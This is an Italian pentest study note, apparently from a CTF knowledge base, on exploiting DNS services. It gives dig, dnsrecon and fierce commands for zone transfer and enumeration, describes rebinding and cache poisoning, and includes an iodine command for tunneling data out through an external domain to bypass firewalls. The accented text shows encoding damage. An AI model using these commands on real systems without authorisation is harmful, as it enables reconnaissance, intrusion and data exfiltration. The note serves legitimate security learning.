#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Zone Transfer]]
- [[#Bruteforce di Subdomain]]
- [[#Record Sensibili]]
- [[#DNS Rebinding]]
- [[#Cache Poisoning]]
- [[#Tunneling e Data Exfiltration]]

---
---
---
### Introduzione
_DNS (Domain Name System)_ Ã¨ un servizio fondamentale che traduce i nomi di dominio in indirizzi IP. Opera tipicamente sulla porta UDP/53 (ma anche TCP/53 per query piÃ¹ grandi, come i _Zone Transfer_).  
A causa della sua natura distribuita e dellâ€™importanza nella risoluzione dei nomi, un server DNS esposto puÃ² diventare un punto critico durante un penetration test, sia per attivitÃ  di _enumerazione_ che di _abuso_ del protocollo.

---
### Zone Transfer
Un classico errore di configurazione Ã¨ permettere il[[ðŸ”¡ Glossario#Zone Transfer| trasferimento di zonaÂ°]] da host non autorizzati, esponendo lâ€™intera struttura del dominio:

```
dig AXFR @ns.target.com target.com
```

Writeups:
- *Linux:*[[Linux#Cronos| Cronos]],[[Linux#FriendZone| FriendZone]],

---
### Bruteforce di Subdomain
Enumerare sottodomini con wordlist apposite:

```
dnsrecon -d target.com -D subdomains.txt -t brt
```

```
fierce -dns target.com
```

---
### Record Sensibili
Ãˆ utile interrogare record specifici per raccogliere informazioni utili:

```
dig MX target.com dig TXT target.com dig -t any target.com
```

Attenzione ai record TXT che potrebbero contenere configurazioni SPF, chiavi DKIM o informazioni sensibili mal gestite.

---
### DNS Rebinding
In presenza di vulnerabilitÃ  lato browser/applicazione, Ã¨ possibile abusare del DNS per _rimbalzare_ una connessione interna:

```
Attaccante controlla dominio â†’ IP esterno â†’ cambia in IP interno`
```

Tool: [singularity](https://github.com/nccgroup/singularity)

---
### Cache Poisoning
Alcuni server DNS vulnerabili possono essere indotti a memorizzare record DNS falsificati:
- Dipende da mancanza di randomizzazione su _transaction ID_ e _source port_
- PuÃ² condurre a _phishing_ o _MiTM_

---
### Tunneling e Data Exfiltration
Alcuni tool sfruttano il DNS per bypassare firewall e _exfiltrare_ dati:

`iodine -f -P password 10.0.0.1 tunnel.domain.com`

Tool:
- `iodine`
- `dnscat2`
- `dns2tcp`

Writeups:
- _Linux:_ [[Linux#Brainpan| Brainpan]]
